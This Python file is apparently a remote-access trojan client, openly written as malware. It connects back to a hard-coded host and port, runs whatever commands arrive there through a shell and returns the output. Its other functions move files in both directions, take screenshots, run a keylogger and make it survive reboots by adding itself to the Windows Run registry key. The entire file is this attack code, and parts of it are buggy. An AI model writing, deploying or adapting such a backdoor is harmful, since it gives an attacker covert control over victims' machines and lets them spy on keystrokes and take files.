import os
import socket
import json
import subprocess
import pyautogui
import keylogger
import threading
import shutil
import sys

'''
Author: Juhi S Iyer
Date: Dec 29, 2021
'''


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
        s.settimeout(None)
        f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata' + '\\' + copy_name]
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created persistence with reg key: ' + reg_name)
        else:
            reliable_send('[+] Persistence already exists')
    except:
        reliable_send('[+] Error creating persistence with the target Machine. ')


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger
            t = threading.thread(target=keylog.start)
            reliable_send('[+] Keylogger has been started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.readlogs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger stopped.')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.2.111', 5555))
shell()